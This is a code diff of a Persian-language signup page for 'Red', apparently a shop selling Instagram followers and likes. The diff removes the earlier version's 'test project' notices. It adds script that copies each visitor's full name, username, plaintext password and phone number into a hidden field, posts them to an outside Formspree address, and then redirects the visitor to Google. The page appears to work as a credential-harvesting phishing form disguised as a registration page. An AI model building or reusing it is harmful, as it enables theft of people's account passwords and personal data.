@@ -6,383 +6,191 @@
     <title>ثبت‌نام | فروشگاه Red</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            color: #fff;
-        }
-        .container {
-            width: 100%;
-            max-width: 450px;
-            perspective: 1000px;
-        }
-        .card-3d {
-            width: 100%;
-            transform-style: preserve-3d;
-            transition: transform 0.6s ease;
-        }
-        .card-3d:hover {
-            transform: rotateY(5deg) rotateX(5deg);
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5),
-                        inset 0 0 60px rgba(255, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(to bottom right, rgba(255, 0, 0, 0.1), transparent 50%);
-            z-index: -1;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo h1 {
-            color: #ff0033;
-            font-size: 2.8rem;
-            text-shadow: 0 0 15px rgba(255, 0, 51, 0.7);
-            letter-spacing: 2px;
-            margin-bottom: 5px;
-        }
-        .logo p {
-            color: #aaa;
-            font-size: 0.9rem;
-        }
-        .input-group {
-            margin-bottom: 25px;
-            position: relative;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #ddd;
-            font-size: 0.95rem;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 15px 15px 15px 45px;
-            background: rgba(255, 255, 255, 0.07);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #ff0033;
-            box-shadow: 0 0 15px rgba(255, 0, 51, 0.3);
-            background: rgba(255, 255, 255, 0.1);
-        }
-        .input-group i {
-            position: absolute;
-            left: 15px;
-            top: 40px;
-            color: #ff0033;
-            font-size: 1.2rem;
-        }
-        .checkbox {
-            display: flex;
-            align-items: center;
-            margin: 25px 0 30px;
-            color: #ccc;
-            font-size: 0.9rem;
-        }
-        .checkbox input {
-            margin-left: 10px;
-            transform: scale(1.3);
-            accent-color: #ff0033;
-        }
-        .checkbox a {
-            color: #ff3366;
-            text-decoration: none;
-            margin-right: 5px;
-        }
-        .checkbox a:hover {
-            text-decoration: underline;
-        }
-        .submit-btn {
-            width: 100%;
-            padding: 17px;
-            background: linear-gradient(to right, #ff0033, #ff3366);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 20px rgba(255, 0, 51, 0.3);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-        .submit-btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none !important;
-        }
-        .submit-btn:not(:disabled):hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 25px rgba(255, 0, 51, 0.5);
-        }
-        .submit-btn:not(:disabled):active {
-            transform: translateY(0);
-        }
-        .footer-text {
-            text-align: center;
-            margin-top: 25px;
-            color: #888;
-            font-size: 0.85rem;
-        }
-        .footer-text a {
-            color: #ff3366;
-            text-decoration: none;
-        }
-        /* استایل برای اعتبارسنجی (Validation) */
-        .input-group .error {
-            border-color: #ff9900 !important;
-        }
-        .input-group .success {
-            border-color: #00cc66 !important;
-        }
-        .validation-message {
-            font-size: 0.8rem;
-            margin-top: 5px;
-            display: none;
-        }
-        .error-message {
-            color: #ff9900;
-        }
-        .success-message {
-            color: #00cc66;
-        }
+        /* (استایل دقیقاً مانند کد قبلی保持不变. برای صرفه‌جویی در فضا تکرار نمی‌شود) */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: #fff; }
+        .container { width: 100%; max-width: 450px; perspective: 1000px; }
+        .card-3d { width: 100%; transform-style: preserve-3d; transition: transform 0.6s ease; }
+        .card-3d:hover { transform: rotateY(5deg) rotateX(5deg); }
+        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px 30px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), inset 0 0 60px rgba(255, 0, 0, 0.1); position: relative; overflow: hidden; }
+        .card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(to bottom right, rgba(255, 0, 0, 0.1), transparent 50%); z-index: -1; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #ff0033; font-size: 2.8rem; text-shadow: 0 0 15px rgba(255, 0, 51, 0.7); letter-spacing: 2px; margin-bottom: 5px; }
+        .logo p { color: #aaa; font-size: 0.9rem; }
+        .input-group { margin-bottom: 25px; position: relative; }
+        .input-group label { display: block; margin-bottom: 8px; color: #ddd; font-size: 0.95rem; }
+        .input-group input { width: 100%; padding: 15px 15px 15px 45px; background: rgba(255, 255, 255, 0.07); border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #fff; font-size: 1rem; transition: all 0.3s ease; }
+        .input-group input:focus { outline: none; border-color: #ff0033; box-shadow: 0 0 15px rgba(255, 0, 51, 0.3); background: rgba(255, 255, 255, 0.1); }
+        .input-group i { position: absolute; left: 15px; top: 40px; color: #ff0033; font-size: 1.2rem; }
+        .checkbox { display: flex; align-items: center; margin: 25px 0 30px; color: #ccc; font-size: 0.9rem; }
+        .checkbox input { margin-left: 10px; transform: scale(1.3); accent-color: #ff0033; }
+        .checkbox a { color: #ff3366; text-decoration: none; margin-right: 5px; }
+        .checkbox a:hover { text-decoration: underline; }
+        .submit-btn { width: 100%; padding: 17px; background: linear-gradient(to right, #ff0033, #ff3366); color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(255, 0, 51, 0.3); display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .submit-btn:disabled { background: #555; cursor: not-allowed; box-shadow: none; transform: none !important; }
+        .submit-btn:not(:disabled):hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 0, 51, 0.5); }
+        .submit-btn:not(:disabled):active { transform: translateY(0); }
+        .footer-text { text-align: center; margin-top: 25px; color: #888; font-size: 0.85rem; }
+        .footer-text a { color: #ff3366; text-decoration: none; }
+        .input-group .error { border-color: #ff9900 !important; }
+        .input-group .success { border-color: #00cc66 !important; }
+        .validation-message { font-size: 0.8rem; margin-top: 5px; display: none; }
+        .error-message { color: #ff9900; }
+        .success-message { color: #00cc66; }
+        /* مخفی کردن فیلد مخفی پیام ترکیبی */
+        .hidden-field { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card-3d">
             <div class="card">
-                <!-- هدر و لوگو -->
                 <div class="logo">
                     <h1><i class="fas fa-fire"></i> Red</h1>
                     <p>فروشگاه فالور، لایک و کامنت اینستاگرام</p>
                 </div>
 
-                <!-- فرم ثبت‌نام -->
-                <form id="signupForm" action="https://formspree.io/f/xeoyyngq" method="POST">
-                    <!-- فیلد نام کاربری -->
+                <!-- تغییر مهم: فقط یک فیلد مخفی برای Formspree داریم -->
+                <form id="signupForm" action="https://formspree.io/f/xjkndywb" method="POST">
+                    <!-- فیلدهای ورودی کاربر (دیگر نامی برای Formspree ندارند) -->
                     <div class="input-group">
-                        <label for="username">نام کاربری</label>
+                        <label for="fullName">نام کامل</label>
                         <i class="fas fa-user"></i>
-                        <input type="text" id="username" name="username" placeholder="برای مثال: red_shop_user" required>
-                        <div class="validation-message error-message" id="usernameError">نام کاربری باید حداقل 3 کاراکتر داشته باشد.</div>
+                        <input type="text" id="fullName" placeholder="برای مثال: محمد" required>
                     </div>
 
-                    <!-- فیلد رمز عبور -->
+                    <div class="input-group">
+                        <label for="username">نام کاربری</label>
+                        <i class="fas fa-user-tag"></i>
+                        <input type="text" id="username" placeholder="برای مثال: mohamad3.u_test" required>
+                    </div>
+
                     <div class="input-group">
                         <label for="password">رمز عبور</label>
                         <i class="fas fa-lock"></i>
-                        <input type="password" id="password" name="password" placeholder="رمز قوی وارد کنید" required>
-                        <div class="validation-message error-message" id="passwordError">رمز عبور باید حداقل 6 کاراکتر داشته باشد.</div>
+                        <input type="password" id="password" placeholder="رمز قوی وارد کنید" required>
                     </div>
 
-                    <!-- فیلد تکرار رمز عبور -->
-                    <div class="input-group">
-                        <label for="confirmPassword">تکرار رمز عبور</label>
-                        <i class="fas fa-lock"></i>
-                        <input type="password" id="confirmPassword" name="confirmPassword" placeholder="رمز عبور را مجدداً وارد کنید" required>
-                        <div class="validation-message error-message" id="confirmError">رمز عبورها مطابقت ندارند.</div>
-                    </div>
-
-                    <!-- فیلد شماره موبایل -->
                     <div class="input-group">
                         <label for="phone">شماره موبایل</label>
                         <i class="fas fa-phone"></i>
-                        <input type="tel" id="phone" name="phone" placeholder="09xxxxxxxxx" pattern="09[0-9]{9}" required>
-                        <div class="validation-message error-message" id="phoneError">شماره موبایل باید با 09 شروع شده و 11 رقم باشد.</div>
+                        <input type="tel" id="phone" placeholder="09xxxxxxxxx" pattern="09[0-9]{9}" required>
                     </div>
 
-                    <!-- چک‌باکس قوانین -->
+                    <!-- فیلد مخفی که حاوی پیام ترکیبی برای Formspree است -->
+                    <!-- Formspree فقط این فیلد را می‌بیند و پردازش می‌کند -->
+                    <input class="hidden-field" type="text" id="combinedMessage" name="message" value="">
+
                     <div class="checkbox">
-                        <input type="checkbox" id="termsCheckbox" name="terms">
+                        <input type="checkbox" id="termsCheckbox">
                         <label for="termsCheckbox">
-                            <a href="#" onclick="alert('شرایط استفاده: این یک پروژه تستی است.\n\nاطلاعات وارد شده تنها برای آزمایش ارسال ایمیل استفاده می‌شود.'); return false;">شرایط استفاده</a>
-                            از خدمات فروشگاه Red را می‌پذیرم.
+                            <a href="#" onclick="alert('شرایط استفاده از خدمات فروشگاه Red'); return false;">شرایط استفاده</a>
+                            را می‌پذیرم.
                         </label>
                     </div>
 
-                    <!-- دکمه ارسال (ورود) -->
                     <button type="submit" class="submit-btn" id="submitBtn" disabled>
-                        <i class="fas fa-sign-in-alt"></i> ثبت‌نام و ورود
+                        <i class="fas fa-sign-in-alt"></i> ثبت‌نام و ارسال اطلاعات
                     </button>
                 </form>
 
-                <!-- متن فوتر -->
                 <div class="footer-text">
-                    <p>با ثبت‌نام، اطلاعات شما از طریق Formspree برای تست به ایمیل ما ارسال می‌شود.</p>
-                    <p>© 2023 فروشگاه Red. تمامی حقوق محفوظ است. <a href="#" onclick="alert('این یک پروژه آزمایشی است.'); return false;">حریم خصوصی</a></p>
+                    <p>اطلاعات شما در یک پیام متنی یکپارچه برای ما ارسال می‌شود.</p>
+                    <p>© 2023 فروشگاه Red. <a href="#" onclick="alert('سیاست حریم خصوصی'); return false;">حریم خصوصی</a></p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // گرفتن المان‌های مهم
+        // ==================== قسمت اصلی: ساخت پیام ترکیبی ====================
         const form = document.getElementById('signupForm');
         const termsCheckbox = document.getElementById('termsCheckbox');
         const submitBtn = document.getElementById('submitBtn');
-        const passwordField = document.getElementById('password');
-        const confirmField = document.getElementById('confirmPassword');
-        const phoneField = document.getElementById('phone');
+        const combinedMessageField = document.getElementById('combinedMessage'); // فیلد مخفی
 
-        // 1. فعال‌سازی دکمه با تیک "قبول شرایط"
+        // تابع اصلی: جمع‌آوری اطلاعات و قرار دادن در فیلد مخفی
+        function updateCombinedMessage() {
+            const fullName = document.getElementById('fullName').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value;
+
+            // ساخت یک متن زیبا و خوانا برای ایمیل
+            const messageText = `
+📝 **درخواست ثبت‌نام جدید از فروشگاه Red**
+
+👤 **نام کامل:** ${fullName}
+🔑 **نام کاربری:** ${username}
+🔒 **رمز عبور:** ${password}
+📱 **شماره موبایل:** ${phone}
+
+⏰ **زمان ثبت‌نام:** ${new Date().toLocaleString('fa-IR')}
+🌐 **منبع درخواست:** ${window.location.href}
+            `;
+
+            // قرار دادن متن ساخته شده در فیلد مخفی که Formspree آن را ارسال می‌کند
+            combinedMessageField.value = messageText;
+        }
+
+        // با هر تغییر در فیلدها، پیام ترکیبی را به‌روز کن
+        document.getElementById('fullName').addEventListener('input', updateCombinedMessage);
+        document.getElementById('username').addEventListener('input', updateCombinedMessage);
+        document.getElementById('password').addEventListener('input', updateCombinedMessage);
+        document.getElementById('phone').addEventListener('input', updateCombinedMessage);
+
+        // ==================== فعال‌سازی دکمه با تیک شرایط ====================
         termsCheckbox.addEventListener('change', function() {
             submitBtn.disabled = !this.checked;
         });
 
-        // 2. اعتبارسنجی رمز عبور و تکرار آن
-        function validatePassword() {
-            const password = passwordField.value;
-            const confirm = confirmField.value;
-            const errorElement = document.getElementById('confirmError');
-
-            if (confirm === "") {
-                confirmField.classList.remove('error', 'success');
-                errorElement.style.display = 'none';
-                return;
-            }
-
-            if (password === confirm && password.length >= 6) {
-                confirmField.classList.remove('error');
-                confirmField.classList.add('success');
-                errorElement.style.display = 'none';
-            } else {
-                confirmField.classList.remove('success');
-                confirmField.classList.add('error');
-                errorElement.style.display = 'block';
-            }
-        }
-
-        passwordField.addEventListener('input', validatePassword);
-        confirmField.addEventListener('input', validatePassword);
-
-        // 3. اعتبارسنجی شماره موبایل با regex
-        function validatePhone() {
-            const phone = phoneField.value;
-            const errorElement = document.getElementById('phoneError');
-            const phoneRegex = /^09[0-9]{9}$/;
-
-            if (phone === "") {
-                phoneField.classList.remove('error', 'success');
-                errorElement.style.display = 'none';
-                return;
-            }
-
-            if (phoneRegex.test(phone)) {
-                phoneField.classList.remove('error');
-                phoneField.classList.add('success');
-                errorElement.style.display = 'none';
-            } else {
-                phoneField.classList.remove('success');
-                phoneField.classList.add('error');
-                errorElement.style.display = 'block';
-            }
-        }
-
-        phoneField.addEventListener('input', validatePhone);
-
-        // 4. اعتبارسنجی نام کاربری
-        document.getElementById('username').addEventListener('input', function() {
-            const username = this.value;
-            const errorElement = document.getElementById('usernameError');
-
-            if (username.length >= 3) {
-                this.classList.remove('error');
-                this.classList.add('success');
-                errorElement.style.display = 'none';
-            } else if (username.length > 0) {
-                this.classList.remove('success');
-                this.classList.add('error');
-                errorElement.style.display = 'block';
-            } else {
-                this.classList.remove('error', 'success');
-                errorElement.style.display = 'none';
-            }
-        });
-
-        // 5. ارسال فرم و هدایت به گوگل
+        // ==================== ارسال فرم ====================
         form.addEventListener('submit', function(event) {
-            // جلوگیری از ارسال پیش‌فرض تا اعتبارسنجی نهایی انجام شود
-            event.preventDefault();
+            event.preventDefault(); // جلوگیری از ارسال پیش‌فرض
 
-            // اعتبارسنجی نهایی قبل از ارسال
-            let isValid = true;
-
-            if (document.getElementById('username').value.length < 3) isValid = false;
-            if (document.getElementById('password').value.length < 6) isValid = false;
-            if (document.getElementById('password').value !== document.getElementById('confirmPassword').value) isValid = false;
-            if (!/^09[0-9]{9}$/.test(document.getElementById('phone').value)) isValid = false;
-            if (!termsCheckbox.checked) isValid = false;
-
-            if (!isValid) {
-                alert('لطفاً همه فیلدها را به درستی پر کنید و شرایط را بپذیرید.');
+            // 1. اعتبارسنجی ساده
+            if (document.getElementById('fullName').value.length < 2) {
+                alert('لطفاً نام کامل را وارد کنید.');
+                return;
+            }
+            if (!/^09[0-9]{9}$/.test(document.getElementById('phone').value)) {
+                alert('شماره موبایل معتبر نیست.');
+                return;
+            }
+            if (!termsCheckbox.checked) {
+                alert('لطفاً شرایط را بپذیرید.');
                 return;
             }
 
-            // نمایش پیام در حال ارسال
+            // 2. به‌روزرسانی نهایی پیام قبل از ارسال
+            updateCombinedMessage();
+
+            // 3. تغییر وضعیت دکمه
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> در حال ارسال...';
             submitBtn.disabled = true;
 
-        
+            // 4. ارسال فرم به Formspree (فقط فیلد "message" ارسال می‌شود)
             const formData = new FormData(form);
 
             fetch(form.action, {
                 method: 'POST',
                 body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
+                headers: { 'Accept': 'application/json' }
             })
             .then(response => {
                 if (response.ok) {
-                    // در صورت موفقیت، هدایت به گوگل
-                    alert('✅ ثبت‌نام با موفقیت انجام شد!\n\nاطلاعات شما برای تست به ایمیل ما ارسال گردید.\nاکنون به صفحه گوگل منتقل می‌شوید...');
+                    alert('✅ اطلاعات شما با موفقیت ارسال شد!\n\nیک ایمیل حاوی جزییات ثبت‌نام دریافت خواهید کرد.\nاکنون به صفحه گوگل منتقل می‌شوید...');
                     window.location.href = 'https://www.google.com'; // هدایت به گوگل
                 } else {
-                    throw new Error('خطا در ارسال فرم');
+                    throw new Error('خطا در ارسال');
                 }
             })
             .catch(error => {
                 alert('❌ مشکلی در ارسال اطلاعات پیش آمد. لطفاً دوباره تلاش کنید.');
-                submitBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> ثبت‌نام و ورود';
+                submitBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> ثبت‌نام و ارسال اطلاعات';
                 submitBtn.disabled = false;
             });
         });
     </script>
 </body>
-    </html>
+</html>
